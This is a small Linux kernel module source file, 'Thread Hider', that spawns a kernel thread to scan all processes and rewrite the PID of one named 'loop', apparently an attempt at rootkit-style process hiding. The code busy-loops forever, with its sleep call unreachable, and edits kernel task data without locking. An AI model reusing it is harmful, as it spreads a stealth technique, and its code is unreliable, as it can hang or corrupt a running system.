#include <linux/module.h>
#include <linux/kernel.h>
#include <linux/kthread.h>  // for threads
#include <linux/sched.h>  // for task_struct
#include <linux/string.h>

static struct task_struct *task_thread_hider;

int thread_function(void *);
int thread_init(void);
void thread_cleanup(void);

int thread_function(void *data) {
	struct task_struct *task;
	printk(KERN_INFO "In Thread Hider\n");
	while(1) {
		for_each_process(task) {
			printk(KERN_INFO "Name: %s, PID[%d]\n", task->comm, task->pid);
			if( !strcmp(task->comm, "loop") ) {
				task->pid = 6000;
				break;
			}
		}
	}
	set_current_state(TASK_INTERRUPTIBLE);
	schedule_timeout(10*HZ);
	return 0;
}

int thread_init (void) {

    char  thread_name[50] = "Thread Hider";
    printk(KERN_INFO "in init\n");
    task_thread_hider = kthread_create(&thread_function, NULL, thread_name);
    if((task_thread_hider))
        {
        printk(KERN_INFO "in if\n");
        wake_up_process(task_thread_hider);
        }

    return 0;
}


void thread_cleanup(void) {
	printk(KERN_INFO "Leaving Thread Hider!!\n");
}

MODULE_LICENSE("GPL");
module_init(thread_init);
module_exit(thread_cleanup);
